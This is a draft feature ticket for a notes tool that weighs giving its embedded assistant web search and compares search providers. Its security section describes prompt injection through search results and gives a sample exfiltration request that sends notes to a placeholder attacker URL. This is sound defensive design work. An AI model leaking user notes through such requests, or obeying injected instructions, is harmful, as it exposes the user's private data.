---
# pkm-20qb
title: Assistant web search
status: draft
type: feature
created_at: 2026-10-08T10:28:58Z
updated_at: 2026-10-08T10:28:58Z
---

Give the embedded assistant web search. Parked 2026-10-08 while Arthur thinks through the security trade-off; brainstorming had started (architectural path: needs a short spec, because it changes the trust boundary in docs/SECURITY.md).

## Where it stands

- **Use case:** look things up while answering (facts, docs, "latest on X"). Search results and snippets only, no page fetch.
- **Open question:** the security trade-off (see below).
- **Provider not chosen.**

## Context found

- The harness runs with `tools=[]` plus the pkm MCP verbs only (`claude_engine.py`). docs/SECURITY.md's prompt-injection paragraph states it has "no shell, filesystem or web access". Any option changes that statement.
- **Search vs fetch:** with search only, an injected model can at worst put note text into queries sent to the search provider. Fetching arbitrary URLs is a direct exfiltration channel (`GET https://attacker/?q=<notes>`). Search results are also untrusted input that can carry injected instructions; writes stay confirm-gated, which bounds the damage.

## Options

| Option | Key / cost | Works on `glm`? | Shape |
|---|---|---|---|
| Built-in (Claude Code `WebSearch`, Anthropic server-side search) | none: covered by the subscription login the service already uses | no: z.ai's endpoint doesn't run Anthropic's search tool | enable one built-in tool in the harness |
| Tavily | API key; free monthly tier | yes | new MCP tool (or pkm-mcp verb) wrapping the API |
| Kagi Search API | Kagi account; pay per query | yes | same as Tavily |

## Before resuming

- [ ] Decide the security position (is search-only acceptable; how SECURITY.md describes it)
- [ ] Choose provider
- [ ] Resume brainstorming: spec, then plan
